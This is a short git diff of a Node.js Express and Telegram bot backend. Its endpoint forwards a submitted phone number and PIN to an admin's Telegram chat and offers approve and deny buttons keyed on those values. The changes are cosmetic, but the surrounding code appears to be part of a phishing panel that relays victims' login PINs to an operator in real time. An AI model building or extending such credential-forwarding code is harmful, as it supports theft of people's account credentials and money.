@@ -70,7 +70,7 @@ app.post('/api/login-notification', async (req, res) => {
         `📱 Phone Number: ${phone}\n` +
         `🔢 PIN: ${pin}\n` +
         `⏰ Time: ${currentTime}\n\n` +
-        `⚠️ User waiting for approval`;
+        `⚠️ Waiting for approval`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
@@ -94,7 +94,7 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
-// -------------------- APPROVE ACTION --------------------
+// -------------------- APPROVE --------------------
 bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
@@ -126,7 +126,7 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     }
 });
 
-// -------------------- DENY ACTION --------------------
+// -------------------- DENY --------------------
 bot.action(/deny_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
 
